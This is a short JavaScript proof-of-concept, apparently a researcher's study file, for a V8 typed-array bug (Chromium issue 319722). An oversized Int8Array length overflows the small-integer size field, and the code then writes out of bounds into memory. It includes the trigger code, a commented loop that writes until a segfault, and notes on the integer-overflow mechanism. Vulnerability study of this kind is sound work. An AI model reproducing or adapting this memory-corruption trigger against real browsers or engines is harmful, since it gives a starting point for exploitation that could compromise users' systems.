// Owner: Jakon Kummerrow
// v8 version: 3.21.18, ia32

var o0 = new Int8Array(10);
var o1 = new Int8Array(0x40000001);
var index = new Int32Array(1);

function write(o2) {
	o2[index[0]] = 0xcc;
}

index[0] = 0x40000000 + 4088;
write(o1);

// Write out of bounds until segfault.
/*for (var i = 0; i < 0xf000000; i++) {
	index[0] = 0x40000000 + i;
	write(a);
}*/


/*
    https://bugs.chromium.org/p/chromium/issues/detail?id=319722

    Prerequisite: SMI(SMall Integers)
        - yields 31bit immediate  signed integers

    "When creating a v8::internal::ExternalArray, which can overflow."
    I don't know why exactly use SMI now,
    however, external array size is treated as SMI by using Smi:FromInt()
    internally. (size_t -> 31-bit signed integer)

    For example,

    var training = new Int8Array(10);  // {10 -> 20 }
    var a = new Int8Array(0x40000001); // {1073741825 -> -2147483646}
    var index = new Int32Array(1);     // {1 -> 2}
*/
